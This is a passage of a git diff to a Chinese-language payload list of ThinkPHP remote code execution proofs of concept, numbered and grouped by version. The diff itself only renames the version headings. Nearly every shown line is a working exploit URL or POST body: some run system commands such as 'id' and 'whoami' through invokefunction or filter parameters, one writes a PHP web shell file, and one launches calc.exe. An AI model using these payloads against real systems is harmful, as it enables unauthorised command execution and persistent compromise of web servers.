@@ -25,7 +25,7 @@ phpMyadmin漏洞：
 6. `http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
 7. `http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
 
-**Thinkphp 5.1.* POC**
+**Thinkphp 5.1.x POC**
 8. `http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1`
 9. `http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd`
 10. `http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E`
@@ -49,5 +49,5 @@ phpMyadmin漏洞：
 **Thinkphp 5.0.10 (完整版) POC**
 34. `(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system`
 
-**Thinkphp 5.1.* 和 5.2.* 和 5.0.* POC**
+**Thinkphp 5.1.x 和 5.2.x 和 5.0.x POC**
 35. `(post)public/index.php (data)c=exec&f=calc.exe&_method=filter`
